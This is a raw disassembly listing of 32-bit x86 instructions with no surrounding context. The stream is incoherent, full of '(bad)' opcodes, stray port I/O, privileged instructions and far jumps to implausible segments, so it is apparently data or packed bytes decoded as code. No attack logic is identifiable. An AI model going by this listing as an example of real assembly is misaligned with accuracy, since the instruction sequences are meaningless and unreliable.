  412814:	(bad)  
  412815:	out    0x90,al
  412817:	call   0xe9b:0xd4aa5987
  41281e:	or     al,0xc2
  412820:	out    dx,eax
  412821:	sbb    ecx,DWORD PTR [edi+edx*4+0x47d2bfa8]
  412828:	les    esp,FWORD PTR [esi]
  41282a:	cwde   
  41282b:	mov    dl,0x18
  41282d:	fsub   QWORD PTR [ebp+eax*8+0xb81ac4]
  412834:	mov    dl,0x9b
  412836:	dec    ecx
  412837:	(bad)  
  412838:	push   edx
  412839:	fcmovb st,st(0)
  41283b:	sbb    DWORD PTR [ebx-0x35bcbfde],ecx
  412841:	jb     0x4127e8
  412843:	cmp    esi,DWORD PTR [esi-0x5befbd55]
  412849:	frstor [edx-0x39]
  41284c:	adc    DWORD PTR [esi+0x4f],esi
  41284f:	sti    
  412850:	ss jmp 0xb4a9384b
  412856:	fdiv   st,st(4)
  412858:	or     DWORD PTR ds:0x3c8be65a,eax
  41285e:	push   edi
  41285f:	jmp    0x427:0xcc5f8d39
  412866:	out    dx,al
  412867:	and    eax,0xdcc4d7c4
  41286c:	or     al,0x75
  41286e:	cwde   
  41286f:	fs jecxz 0x4128eb
  412872:	dec    esp
  412873:	fsub   QWORD PTR [ebp-0x4e]
  412876:	pop    edi
  412877:	jl     0x4128bc
  412879:	sahf   
  41287a:	mov    eax,ds:0x9fc5ca30
  41287f:	lods   eax,DWORD PTR ds:[esi]
  412880:	sub    al,0xf4
  412882:	rcr    DWORD PTR [ecx],cl
  412884:	or     eax,0x9ff0d140
  412889:	stos   BYTE PTR es:[edi],al
  41288a:	dec    eax
  41288b:	xor    bl,BYTE PTR [eax]
  41288d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41288e:	iret   
  41288f:	fwait
  412890:	pusha  
  412891:	mov    eax,0xa458f769
  412896:	aaa    
  412897:	dec    eax
  412898:	adc    ah,dh
  41289a:	cs pop ds
  41289c:	not    BYTE PTR [ecx+0x6d]
  41289f:	dec    ebp
  4128a0:	in     eax,0xd2
  4128a2:	cmp    cl,ch
  4128a4:	push   0x9a71cc6e
  4128a9:	cmp    al,BYTE PTR [edi]
  4128ab:	aad    0x83
  4128ad:	push   ebp
  4128ae:	mov    ecx,0x1f3ba3b0
  4128b3:	repz sbb DWORD PTR [esi],ebp
  4128b6:	shl    BYTE PTR [esi+0x4ea0cd2],0xed
  4128bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128be:	mov    bl,0x6
  4128c0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c2:	dec    edx
  4128c3:	enter  0x97ec,0x50
  4128c7:	ins    BYTE PTR es:[edi],dx
  4128c8:	rcr    DWORD PTR [ebx-0x57],1
  4128cb:	sbb    al,0x81
  4128cd:	sub    al,0x89
  4128cf:	xchg   edi,eax
  4128d0:	in     al,0x66
  4128d2:	mov    eax,0x34d6ffbb
  4128d7:	mov    edi,0x919f03b1
  4128dc:	mov    al,ds:0x2a6110fb
  4128e1:	dec    edi
  4128e2:	cmc    
  4128e3:	sbb    al,0x56
  4128e5:	pop    ss
  4128e6:	push   ebx
  4128e7:	sbb    DWORD PTR [ebx],esi
  4128e9:	dec    ecx
  4128ea:	mov    dh,0x9f
  4128ec:	add    bh,BYTE PTR ds:0xdd572f53
  4128f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128f3:	lahf   
  4128f4:	xchg   BYTE PTR [ecx+0x3a],dh
  4128f7:	das    
  4128f8:	cmp    al,0x74
  4128fa:	pop    ebp
  4128fb:	daa    
  4128fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128fd:	pop    ds
  4128fe:	pop    ss
  4128ff:	inc    esi
  412900:	stos   BYTE PTR es:[edi],al
  412901:	ins    BYTE PTR es:[edi],dx
  412902:	pusha  
  412903:	inc    edx
  412904:	jle    0x41288a
  412906:	dec    esi
  412907:	mov    ebx,0xf4cf9107
  41290c:	add    al,BYTE PTR [edi]
  41290e:	ja     0x4128ed
  412910:	or     BYTE PTR [esi],0xd7
  412913:	xlat   BYTE PTR ds:[ebx]
  412914:	int    0x58
  412916:	xchg   DWORD PTR [ecx],ebp
  412918:	push   esi
  412919:	ds mov WORD PTR fs:[edx],es
  41291d:	jp     0x412911
  41291f:	cdq    
  412920:	out    dx,eax
  412921:	dec    esp
  412922:	add    eax,0xf98cd686
  412927:	outs   dx,BYTE PTR ds:[esi]
  412928:	arpl   sp,dx
  41292a:	(bad)  
  41292b:	mov    ds:0x9b2bbbac,al
  412930:	retf   
  412931:	add    al,0xee
  412933:	mov    esi,0x9d3554fa
  412938:	bound  edx,QWORD PTR [edx]
  41293a:	add    eax,0x4ccd747b
  41293f:	pop    esi
  412940:	int3   
  412941:	aad    0xfa
  412943:	jae    0x4128d7
  412945:	sub    eax,edi
  412947:	xchg   BYTE PTR [esp+esi*2+0x32],bl
  41294b:	cmp    DWORD PTR [eax-0x455c6a83],0xfc90692e
  412955:	imul   esi,DWORD PTR [ebp-0x3b],0x632d3b68
  41295c:	and    cl,BYTE PTR [ebp-0x33]
  41295f:	lods   eax,DWORD PTR ds:[esi]
  412960:	dec    ecx
  412961:	or     eax,0x229c0081
  412966:	imul   edx,ebx,0x963774dc
  41296c:	xor    ecx,edi
  41296e:	push   edx
  41296f:	dec    eax
  412970:	mov    ch,0xb6
  412972:	cmp    eax,0x9eb6670
  412977:	cmp    dh,BYTE PTR ds:0x9746e94d
  41297d:	xchg   esi,eax
  41297e:	into   
  41297f:	into   
  412980:	mov    gs,WORD PTR [edi+0x56]
  412983:	inc    edx
  412984:	cmp    al,0x1
  412986:	add    BYTE PTR [ecx+esi*1],0x31
  41298a:	sbb    al,bl
  41298c:	pop    ss
  41298d:	(bad)  
  41298e:	test   BYTE PTR [eax+ecx*2+0x378f5aa0],bl
  412995:	sbb    al,0x3
  412997:	addr16 mov ds:0x54df,eax
  41299b:	loope  0x412947
  41299d:	mov    WORD PTR [eax],?
  41299f:	pop    esi
  4129a0:	ds into 
  4129a2:	test   al,0xf6
  4129a4:	pop    edx
  4129a6:	jp     0x4129c7
  4129a8:	in     al,dx
  4129a9:	lods   al,BYTE PTR ds:[esi]
  4129aa:	xor    DWORD PTR [esp+edx*8+0x27dd28e2],ebx
  4129b1:	push   eax
  4129b2:	icebp  
  4129b3:	jbe    0x412996
  4129b5:	icebp  
  4129b6:	mov    dh,0x45
  4129b8:	mov    ch,0xc1
  4129ba:	pop    eax
  4129bb:	mov    ah,0xc6
  4129bd:	pop    esi
  4129be:	bound  eax,QWORD PTR [esp+eiz*8]
  4129c1:	rcr    DWORD PTR ss:[ebx+0x63],0x99
  4129c6:	repnz dec edx
  4129c8:	sbb    BYTE PTR [ecx+0x4b],dh
  4129cb:	pusha  
  4129cc:	sub    esi,DWORD PTR [esi+edi*1-0x62]
  4129d0:	or     esp,DWORD PTR [eax+0x37fd3394]
  4129d6:	mov    dh,0xf9
  4129d8:	mov    cl,0x4
  4129da:	adc    al,0xe5
  4129dc:	add    ebp,DWORD PTR cs:[esi]
  4129df:	mov    eax,ds:0x5b13ea9b
  4129e4:	mov    ebp,DWORD PTR ds:0x1e519e90
  4129ea:	dec    ebp
  4129eb:	(bad)  
  4129ec:	cdq    
  4129ed:	addr16 jg 0x412a48
  4129f0:	out    0x79,al
  4129f2:	add    al,0xdb
  4129f4:	pop    ss
  4129f5:	lahf   
  4129f6:	or     BYTE PTR [edx+0x3a7d64e0],dl
  4129fc:	mov    ?,WORD PTR [ebx-0x15]
  4129ff:	mov    ds:0x854fafaa,eax
  412a04:	add    BYTE PTR [esi],bh
  412a06:	and    bh,BYTE PTR [ebx+eax*1+0xc96ee73]
  412a0d:	xor    bl,al
  412a0f:	out    dx,al
  412a10:	pop    edi
  412a11:	jmp    0x23139725
  412a16:	ret    0xb775
  412a19:	aas    
  412a1a:	inc    esp
  412a1b:	or     BYTE PTR [ebx+0x5aac94c5],ch
  412a21:	xchg   ebp,eax
  412a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a23:	call   0x1754002
  412a28:	inc    esi
  412a29:	fisub  WORD PTR [ebp-0x40f438ec]
  412a2f:	and    BYTE PTR [esi-0x6d],dh
  412a32:	test   DWORD PTR [eax],0x1fdef2bd
  412a38:	ror    ebx,0xa3
  412a3b:	or     cl,BYTE PTR [edi-0x396b77f7]
  412a41:	jno    0x4129ed
  412a43:	jg     0x412a5b
  412a45:	out    dx,eax
  412a46:	data16 cld 
  412a48:	xchg   ecx,eax
  412a49:	push   ds
  412a4a:	push   ss
  412a4b:	jb     0x412a1f
  412a4d:	sahf   
  412a4e:	int    0x99
  412a50:	mov    esi,0x98288cdb
  412a55:	pop    es
  412a56:	xchg   BYTE PTR [ecx+0x72],ah
  412a59:	mov    esp,0xef3319d2
  412a5e:	jne    0x4129f1
  412a60:	pop    eax
  412a61:	mov    eax,ds:0xebf3f1b9
  412a66:	jp     0x412a96
  412a68:	test   eax,0xaf77f301
  412a6d:	int    0xc8
  412a6f:	(bad)  
  412a70:	cli    
  412a71:	call   0xc756:0x809758e0
  412a78:	cli    
  412a79:	dec    ecx
  412a7a:	pop    ebx
  412a7b:	mov    cl,0x8a
  412a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a7e:	pop    edx
  412a7f:	mov    WORD PTR [ebp-0x5b],ds
  412a82:	push   es
  412a83:	or     eax,0xfe4da6b2
  412a88:	inc    esi
  412a89:	in     eax,0x43
  412a8b:	das    
  412a8c:	push   esp
  412a8d:	sbb    edx,esp
  412a8f:	out    dx,al
  412a90:	push   0x70cb4723
  412a95:	outs   dx,DWORD PTR ds:[esi]
  412a96:	sub    eax,0xbc7df9b8
  412a9b:	sub    al,0xee
  412a9d:	cmp    eax,0x71aa0202
  412aa2:	xor    ecx,0xffffffb0
  412aa5:	mov    DWORD PTR [eax+0x47f22f2d],ecx
  412aab:	fwait
  412aac:	sbb    BYTE PTR [edi],al
  412aae:	nop
  412aaf:	mov    BYTE PTR [edx-0x6f],bh
  412ab2:	pusha  
  412ab3:	fimul  WORD PTR [ecx-0x55]
  412ab6:	push   ebp
  412ab7:	lods   al,BYTE PTR ds:[esi]
  412ab8:	icebp  
  412ab9:	mov    bh,cl
  412abb:	loop   0x412b2c
  412abd:	stc    
  412abe:	or     eax,0x3b707b3a
  412ac3:	stos   BYTE PTR es:[edi],al
  412ac4:	mov    bl,BYTE PTR [ecx+ebp*1+0x3b]
  412ac8:	push   ecx
  412ac9:	and    BYTE PTR [eax],ch
  412acb:	push   0x3c57a237
  412ad0:	jecxz  0x412acd
  412ad2:	dec    eax
  412ad3:	aaa    
  412ad4:	and    ecx,DWORD PTR [ecx+0x42]
  412ad7:	and    BYTE PTR [ecx+0x1f],0x96
  412adb:	(bad)  
  412adc:	lock pop esp
  412ade:	xchg   esp,eax
  412adf:	pushf  
  412ae0:	and    DWORD PTR [ebx+0x19],edx
  412ae3:	(bad)  
  412ae4:	sbb    al,0x21
  412ae6:	mov    bh,0x50
  412ae8:	rol    esp,cl
  412aea:	mov    eax,ds:0x7c73008
  412aef:	mov    cl,0x81
  412af1:	push   0x2b
  412af3:	and    eax,DWORD PTR [esi]
  412af5:	adc    esp,DWORD PTR [ecx]
  412af7:	imul   BYTE PTR [ecx-0x310aea6f]
  412afd:	xor    al,0xb4
  412aff:	imul   ebx,ebx,0xffffffb6
  412b02:	xchg   ebp,eax
  412b03:	retf   0x2ecd
  412b06:	jne    0x412b3f
  412b08:	lea    esp,[edx-0x61]
  412b0b:	sbb    eax,0x2b1bff74
  412b10:	ins    DWORD PTR es:[edi],dx
  412b11:	pop    ebx
  412b12:	ret    0x5b5b
  412b15:	imul   ebx,DWORD PTR [ebx-0xaf29b02],0x6f
  412b1c:	and    cl,BYTE PTR [ebx]
  412b1e:	mov    ebp,0xe38eb4e4
  412b23:	and    eax,0x83c6dbcd
  412b28:	sahf   
  412b29:	pusha  
  412b2a:	push   ss
  412b2b:	in     eax,dx
  412b2c:	test   eax,0x66c7182d
  412b31:	mov    esi,0xad1f75a7
  412b36:	adc    bl,BYTE PTR [edx-0x13]
  412b39:	clc    
  412b3a:	rcl    DWORD PTR [ebx],0x74
  412b3d:	sar    ebx,1
  412b3f:	fcmovu st,st(5)
  412b41:	int3   
  412b42:	int    0xa1
  412b44:	inc    edi
  412b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b47:	in     eax,0xf1
  412b49:	fstp   st(1)
  412b4b:	mov    ss,WORD PTR [edx+0x41f98d0f]
  412b51:	add    ah,BYTE PTR [ebp-0x18]
  412b54:	loopne 0x412b70
  412b56:	in     al,0xbf
  412b58:	aaa    
  412b59:	cmp    ebx,edi
  412b5b:	cmp    BYTE PTR [eax+0x56],dh
  412b5e:	loopne 0x412b98
  412b60:	mov    ds:0xc50823e4,al
  412b65:	mov    dh,0xd8
  412b67:	ds dec edi
  412b69:	and    edx,DWORD PTR [edx+ebp*4-0x22abac1e]
  412b70:	xchg   esp,eax
  412b71:	dec    ecx
  412b72:	xchg   esi,eax
  412b73:	add    eax,0x1130a5dc
  412b78:	mov    esi,0x3e6af473
  412b7d:	push   ss
  412b7e:	pextrw esp,mm0,0x7
  412b82:	and    al,dh
  412b84:	dec    edx
  412b85:	push   0x5dc5de1f
  412b8a:	add    bl,BYTE PTR [eax]
  412b8c:	sub    dl,BYTE PTR ds:0xef8062c8
  412b92:	xor    ch,ch
  412b94:	jae    0x412b63
  412b96:	dec    ebp
  412b97:	cmp    dl,0xbc
  412b9a:	pop    ebp
  412b9b:	xchg   DWORD PTR [edi+ebx*2+0x78],edx
  412b9f:	les    eax,FWORD PTR [edx+0x10]
  412ba2:	xor    edi,DWORD PTR [edi]
  412ba4:	outs   dx,DWORD PTR ds:[esi]
  412ba5:	out    dx,al
  412ba6:	pop    ebp
  412ba7:	sub    dl,bl
  412ba9:	jnp    0x412b67
  412bab:	in     eax,0xc2
  412bad:	leave  
  412bae:	cmp    dl,BYTE PTR [esi-0x39]
  412bb1:	in     al,0x17
  412bb3:	inc    ecx
  412bb4:	fnstenv [edx+0x62]
  412bb7:	pop    edi
  412bb8:	mov    edx,eax
  412bba:	add    al,0xa0
  412bbc:	pop    esp
  412bbd:	sub    DWORD PTR [ecx+0x5c2c8a8a],ebx
  412bc3:	cmp    eax,0x8b734af0
  412bc8:	mov    ebp,0x6d31708d
  412bcd:	push   edx
  412bce:	loopne 0x412ba8
  412bd0:	inc    ecx
  412bd1:	mov    ecx,0x239186fe
  412bd6:	xor    BYTE PTR [esi-0xe16ec35],ch
  412bdc:	jle    0x412c36
  412bde:	jo     0x412c15
  412be0:	nop
  412be1:	mov    esi,0x2172da35
  412be6:	cmp    edi,DWORD PTR [ecx-0x4ff05479]
  412bec:	scas   eax,DWORD PTR es:[edi]
  412bed:	mov    ?,eax
  412bef:	push   ecx
  412bf0:	je     0x412bea
  412bf2:	inc    ebx
  412bf3:	sub    DWORD PTR [edx],0x64
  412bf6:	ret    
  412bf7:	cmp    cl,bl
  412bf9:	gs add esp,ecx
  412bfc:	mov    bh,0xe7
  412bfe:	push   edx
  412bff:	jge    0x412ba1
  412c01:	dec    eax
  412c02:	mov    ch,0x91
  412c04:	xor    ebp,DWORD PTR [eax-0x7ca310c]
  412c0a:	cmp    DWORD PTR [edx+0x42],ecx
  412c0d:	rcr    ah,cl
  412c0f:	shr    DWORD PTR [edx-0x3b],cl
  412c12:	sbb    eax,edx
  412c14:	lods   eax,DWORD PTR ds:[esi]
  412c15:	shl    BYTE PTR [edx+edi*8-0x659956fd],1
  412c1c:	xchg   esi,eax
  412c1d:	xchg   ecx,eax
  412c1e:	(bad)  
  412c1f:	jg     0x412c66
  412c21:	push   eax
  412c22:	add    BYTE PTR [ebx],bl
  412c24:	arpl   sp,bx
  412c26:	and    DWORD PTR [edx],ebx
  412c28:	dec    ebx
  412c29:	ins    BYTE PTR es:[edi],dx
  412c2a:	add    al,0xd8
  412c2c:	icebp  
  412c2d:	pop    eax
  412c2e:	nop
  412c2f:	cdq    
  412c30:	stos   DWORD PTR es:[edi],eax
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	mov    esi,0xd990745d
  412c37:	mov    eax,ds:0xda69b212
  412c3c:	(bad)  
  412c3d:	shl    DWORD PTR [esi],1
  412c3f:	pushf  
  412c40:	pop    DWORD PTR [ebx-0x62a8d825]
  412c46:	(bad)  
  412c47:	mov    ah,0x1d
  412c49:	jecxz  0x412c08
  412c4b:	push   es
  412c4c:	out    dx,eax
  412c4d:	xlat   BYTE PTR ds:[ebx]
  412c4e:	inc    edi
  412c4f:	lods   al,BYTE PTR ds:[esi]
  412c50:	sbb    BYTE PTR [ecx],ah
  412c52:	popa   
  412c53:	adc    DWORD PTR [edi+0x78],edx
  412c56:	data16 jo 0x412c15
  412c59:	push   0xc6c960b
  412c5e:	push   es
  412c5f:	sbb    eax,0x37d2e135
  412c64:	nop
  412c65:	nop
  412c66:	add    bl,bl
  412c68:	sub    ecx,ebx
  412c6a:	jl     0x412caa
  412c6c:	mov    edx,0x6dbc7a53
  412c71:	mov    ds:0xb46a25fa,eax
  412c76:	xchg   ebx,eax
  412c77:	sbb    BYTE PTR [eax-0x4293af4],bh
  412c7d:	nop
  412c7e:	jae    0x412c78
  412c80:	jns    0x412c0c
  412c82:	(bad)  
  412c83:	rcr    BYTE PTR [ecx-0x2b],0x45
  412c87:	pop    ecx
  412c88:	dec    edx
  412c89:	jge    0x412c9b
  412c8b:	cmp    DWORD PTR ds:0xec357623,ebp
  412c91:	retf   0x7858
  412c94:	cs pop ecx
  412c96:	rcl    DWORD PTR [ebp-0x3c],cl
  412c99:	in     al,0x92
  412c9b:	lahf   
  412c9c:	add    ebx,ecx
  412c9e:	je     0x412c3a
  412ca0:	in     al,dx
  412ca1:	stos   BYTE PTR es:[edi],al
  412ca2:	aam    0x9c
  412ca4:	dec    esp
  412ca5:	sbb    DWORD PTR [edx+0x3528c47e],eax
  412cab:	icebp  
  412cac:	sub    eax,0xd3febd08
  412cb1:	ins    BYTE PTR es:[edi],dx
  412cb2:	es (bad) 
  412cb4:	sbb    BYTE PTR [esi+0x7c],0x56
  412cb8:	mov    ecx,0xc0636623
  412cbd:	into   
  412cbe:	push   0x7d
  412cc0:	push   es
  412cc1:	pop    esp
  412cc2:	sar    BYTE PTR [eax+0x38],1
  412cc5:	mov    bh,0x71
  412cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cc8:	adc    DWORD PTR [esi],ebp
  412cca:	pop    ebx
  412ccb:	retf   0x5675
  412cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ccf:	push   cs
  412cd0:	xor    ebx,esp
  412cd2:	sbb    BYTE PTR ds:0xd058e697,dh
  412cd8:	data16 mov dl,al
  412cdb:	in     al,dx
  412cdc:	pusha  
  412cdd:	add    bl,bh
  412cdf:	lock cmp al,0x3c
  412ce2:	retf   0x10f4
  412ce5:	xchg   esp,eax
  412ce6:	and    DWORD PTR [ebx+ecx*8],edx
  412ce9:	xchg   esp,eax
  412cea:	cli    
  412ceb:	cld    
  412cec:	sbb    al,0x35
  412cee:	jle    0x412d4a
  412cf0:	iret   
  412cf1:	js     0x412ca4
  412cf3:	push   esp
  412cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf5:	test   BYTE PTR [edx+0x6b],ah
  412cf8:	inc    ebx
  412cf9:	xchg   edx,eax
  412cfa:	jo     0x412d62
  412cfc:	dec    esi
  412cfd:	pusha  
  412cfe:	repnz mov al,ah
  412d01:	pop    ecx
  412d02:	sbb    BYTE PTR [esi+0x29cb2aa6],dh
  412d08:	xchg   DWORD PTR [edx-0x33],edx
  412d0b:	inc    esp
  412d0c:	fimul  DWORD PTR [edi+0x11c067cd]
  412d12:	mov    ebx,0x8a872768
  412d17:	adc    cl,BYTE PTR [edx-0x5070f6b6]
  412d1d:	ds jno 0x412d64
  412d20:	sub    DWORD PTR [esp+ebp*1],esp
  412d23:	mov    fs,ebp
  412d25:	or     DWORD PTR [edi+0x46],0xffffffd8
  412d29:	pop    ebp
  412d2a:	and    DWORD PTR [ebp-0x56],0x7f455485
  412d31:	inc    esi
  412d32:	jmp    0x412cd1
  412d34:	imul   edx,edi,0x49dc17db
  412d3a:	push   ss
  412d3b:	push   ebx
  412d3c:	sar    BYTE PTR [ebp+0x59],cl
  412d3f:	js     0x412d88
  412d41:	es push ecx
  412d43:	dec    eax
  412d44:	outs   dx,DWORD PTR ds:[esi]
  412d45:	mov    edi,0xfae2efc8
  412d4b:	fsubr  QWORD PTR ds:0xfa59597a
  412d51:	push   eax
  412d52:	in     eax,0xf8
  412d54:	or     eax,0xe52dadc6
  412d59:	pop    ebp
  412d5a:	pop    ebp
  412d5b:	jno    0x412d83
  412d5d:	sbb    ah,BYTE PTR [ebp+0x67]
  412d60:	shl    BYTE PTR [edi-0x56bac8f9],0x6
  412d67:	ins    BYTE PTR es:[edi],dx
  412d68:	xor    BYTE PTR [ebx],ah
  412d6a:	lods   eax,DWORD PTR ds:[esi]
  412d6b:	xchg   edi,eax
  412d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d6d:	add    BYTE PTR [ebx],al
  412d6f:	push   0xffffff84
  412d71:	outs   dx,DWORD PTR ds:[esi]
  412d72:	pusha  
  412d73:	pop    esi
  412d74:	mov    ds:0xd8a43c55,al
  412d79:	push   edx
  412d7a:	mov    ecx,0x231cb5d4
  412d7f:	lss    edi,FWORD PTR [ecx+eax*4]
  412d83:	gs pushf 
  412d85:	dec    DWORD PTR [ebx+ebx*4]
  412d88:	cmp    al,0xaa
  412d8a:	jmp    0xd166:0xca8e7209
  412d91:	loope  0x412d60
  412d93:	ds mov sp,0xdaf2
  412d98:	lock inc edx
  412d9a:	push   esp
  412d9b:	shl    WORD PTR [edi+ecx*4-0x62],0x3c
  412da1:	pop    ecx
  412da2:	sbb    ecx,0x44
  412da5:	mov    ds:0x33b38090,al
  412daa:	cmp    eax,0x7dca20e0
  412daf:	lds    esp,FWORD PTR [ebx]
  412db1:	jmp    0x412d84
  412db3:	fisttp DWORD PTR [esi]
  412db5:	repz cmp al,0xb6
  412db8:	push   esp
  412db9:	outs   dx,DWORD PTR ds:[esi]
  412dba:	daa    
  412dbb:	fimul  DWORD PTR [eax+0x65efbb43]
  412dc1:	inc    sp
  412dc3:	mul    BYTE PTR [eax+0x1519fd50]
  412dc9:	cmp    ch,ah
  412dcb:	pop    ds
  412dcc:	jo     0x412e37
  412dce:	mov    eax,ds:0x92b79bda
  412dd3:	repnz push 0xffffffc3
  412dd6:	and    eax,0x6cf70f0b
  412ddb:	ret    
  412ddc:	xlat   BYTE PTR ds:[ebx]
  412ddd:	jp     0x412da6
  412ddf:	fisttp WORD PTR [edi+ebp*4-0x370a45f2]
  412de6:	(bad)  
  412de7:	out    dx,eax
  412de8:	pop    esp
  412de9:	test   al,0xd7
  412deb:	pop    ebx
  412dec:	outs   dx,BYTE PTR ds:[esi]
  412ded:	sbb    eax,ecx
  412def:	sahf   
  412df0:	push   ss
  412df1:	scas   eax,DWORD PTR es:[edi]
  412df2:	imul   esp,DWORD PTR [edx-0x5e],0xffffffe8
  412df6:	push   esp
  412df7:	cmp    dl,0x4d
  412dfa:	inc    eax
  412dfb:	js     0x412d8a
  412dfd:	aad    0xa7
  412dff:	xchg   esp,eax
  412e00:	jno    0x412e5b
  412e02:	jecxz  0x412de7
  412e04:	ss mov esi,0x144bfb57
  412e0a:	lds    eax,FWORD PTR [esi+0x607fc3fb]
  412e10:	jns    0x412dde
  412e12:	fsubr  DWORD PTR [ebx-0x1]
  412e15:	loop   0x412e85
  412e17:	push   esp
  412e18:	ds jmp 0x412e0b
  412e1b:	or     DWORD PTR [edi+0x3452157d],esi
  412e21:	inc    edx
  412e22:	pop    esp
  412e23:	je     0x412e8a
  412e25:	ins    DWORD PTR es:[edi],dx
  412e26:	cmp    al,0x5c
  412e28:	call   DWORD PTR [edi+ebx*8+0x79]
  412e2c:	add    eax,0x46609675
  412e31:	pop    esi
  412e32:	popf   
  412e33:	jne    0x412e66
  412e35:	xchg   ecx,eax
  412e36:	imul   esi,DWORD PTR [ebx],0x32
  412e39:	push   0x2c7ff6b2
  412e3e:	push   cs
  412e3f:	mov    al,ds:0x7c4db
  412e44:	and    esp,DWORD PTR [edx-0x7f]
  412e47:	addr16 sub esi,0xea7bd6a7
  412e4e:	dec    ebp
  412e4f:	out    0xee,al
  412e51:	test   DWORD PTR [edx],ebx
  412e53:	popa   
  412e54:	(bad)  
  412e55:	xor    al,0xb1
  412e57:	adc    ah,BYTE PTR [eax-0x40]
  412e5a:	inc    edi
  412e5b:	rol    DWORD PTR [edi+0x7],0x2d
  412e5f:	or     BYTE PTR [ebx+ecx*4],ah
  412e62:	lods   eax,DWORD PTR ds:[esi]
  412e63:	xlat   BYTE PTR ds:[ebx]
  412e64:	dec    esi
  412e65:	cmp    ebx,DWORD PTR [eax+0x30]
  412e68:	into   
  412e69:	fadd   st(5),st
  412e6b:	xchg   ebx,eax
  412e6c:	std    
  412e6d:	xor    al,0x7d
  412e6f:	les    ecx,FWORD PTR [ecx]
  412e71:	xor    eax,0x13f915f7
  412e76:	push   edx
  412e77:	push   edi
  412e78:	loopne 0x412e03
  412e7a:	iret   
  412e7b:	xchg   esi,eax
  412e7c:	rol    BYTE PTR [ebx-0x32c157cf],1
  412e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e83:	or     BYTE PTR [esi-0x321ba951],dh
  412e89:	out    0x72,al
  412e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e8c:	or     eax,0x797651bc
  412e91:	jno    0x412ee1
  412e93:	mov    ecx,0xe66d884d
  412e98:	mov    cl,0x62
  412e9a:	(bad)  
  412e9b:	and    al,0x2c
  412e9d:	jmp    0x298afd37
  412ea2:	adc    BYTE PTR [ecx],ah
  412ea4:	shr    esi,1
  412ea6:	cmc    
  412ea7:	leave  
  412ea8:	add    bh,bh
  412eaa:	mov    ebx,0x9dc8ed1c
  412eaf:	daa    
  412eb0:	repz jns 0x412f12
  412eb3:	loopne 0x412ec5
  412eb5:	xchg   BYTE PTR [ecx],ah
  412eb7:	sbb    DWORD PTR [eax+ebx*4+0xa],edi
  412ebb:	fbstp  TBYTE PTR [eax+eiz*4-0x2e]
  412ebf:	scas   al,BYTE PTR es:[edi]
  412ec0:	inc    ebx
  412ec1:	jg     0x412f20
  412ec3:	add    ecx,edx
  412ec5:	fadd   st,st(1)
  412ec7:	jmp    0xae19b354
  412ecc:	popf   
  412ecd:	enter  0x368e,0x20
  412ed1:	das    
  412ed2:	sub    eax,0x6eca66be
  412ed7:	lds    edx,FWORD PTR [eax]
  412ed9:	jbe    0x412f1b
  412edb:	pop    ebp
  412edc:	inc    esi
  412edd:	popf   
  412ede:	jbe    0x412e84
  412ee0:	popf   
  412ee1:	lods   al,BYTE PTR ds:[esi]
  412ee2:	out    0x55,eax
  412ee4:	sub    al,0xe
  412ee6:	mov    BYTE PTR [ebx-0xf],bl
  412ee9:	addr16 inc ebp
  412eeb:	pop    esi
  412eec:	(bad)  
  412eed:	jle    0x412f0e
  412eef:	popf   
  412ef0:	xor    BYTE PTR [ebx+edx*8+0x59593cb5],ah
  412ef7:	jge    0x412f1d
  412ef9:	shl    DWORD PTR [ecx+0x7e8dab88],cl
  412eff:	lds    ebp,FWORD PTR [edx-0x2120a21d]
  412f05:	leave  
  412f06:	scas   eax,DWORD PTR es:[edi]
  412f07:	mov    ebp,0xe8d343a7
  412f0c:	adc    eax,0xb8011047
  412f11:	bound  ebp,QWORD PTR [ebx]
  412f13:	test   eax,0x86e5dc0a
  412f18:	nop
  412f19:	add    BYTE PTR [eax-0x16bfa1f1],dh
  412f1f:	mov    edi,0xb3a88d4c
  412f24:	or     al,0xa5
  412f26:	daa    
  412f27:	dec    ebx
  412f28:	and    eax,0x9b646584
  412f2d:	sub    esi,DWORD PTR [ebx]
  412f2f:	mov    ds,WORD PTR cs:[eax+0x3dccda32]
  412f36:	mov    esp,0x4d892ca4
  412f3b:	popf   
  412f3c:	retf   0xa37
  412f3f:	sub    BYTE PTR [eax+0x15],0x6b
  412f43:	and    cl,ch
  412f45:	ret    
  412f46:	mul    BYTE PTR [ebx-0x1fb3018c]
  412f4c:	pop    ss
  412f4d:	push   ds
  412f4e:	std    
  412f4f:	jne    0x412f36
  412f51:	dec    ebp
  412f52:	lods   eax,DWORD PTR ds:[esi]
  412f53:	iret   
  412f54:	cmp    BYTE PTR [ebp+0x6cfdef51],dl
  412f5a:	mov    ebx,0xc7f759de
  412f5f:	inc    esp
  412f60:	rcr    DWORD PTR [esi-0x59aa0ed6],cl
  412f66:	inc    edi
  412f67:	and    eax,0x8378dbe7
  412f6c:	jne    0x412fa9
  412f6e:	outs   dx,BYTE PTR ds:[esi]
  412f6f:	call   0x327b9e23
  412f74:	add    edx,DWORD PTR [esi+0x34]
  412f77:	mov    edi,DWORD PTR [edi+0x64]
  412f7a:	fild   DWORD PTR [ebx+0x65]
  412f7d:	out    dx,eax
  412f7e:	add    al,0xec
  412f80:	xor    bl,BYTE PTR [edx-0xb]
  412f83:	std    
  412f84:	ss popa 
  412f86:	mov    dl,0xfc
  412f88:	push   0xffffffa7
  412f8a:	lock sub BYTE PTR [eax-0x4740c66],dh
  412f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f92:	mov    ebx,0x310ac7ac
  412f97:	imul   edx,DWORD PTR [ecx],0x771362ca
  412f9d:	inc    eax
  412f9e:	pop    ebp
  412f9f:	pushf  
  412fa0:	add    cl,ch
